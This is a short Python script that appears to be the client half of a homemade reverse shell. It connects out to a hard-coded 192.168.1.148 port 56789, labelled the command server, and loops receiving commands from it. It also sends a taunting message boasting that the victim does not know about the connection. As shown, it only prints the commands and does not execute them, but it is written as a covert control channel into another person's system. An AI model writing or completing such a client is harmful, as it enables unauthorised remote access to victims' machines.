
#!/usr/bin/python

import socket


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.148", 56789))

def shell():
	while True:
		server_cmd = s.recv(1024);
		if server_cmd == 'q':
			break
		else:
			client_message = "Client still don't know im connected to their system..... LOL"
			s.send(client_message)
			print("[MSG] Message from the Command Server:  [%s]" %server_cmd)


shell()
s.close()



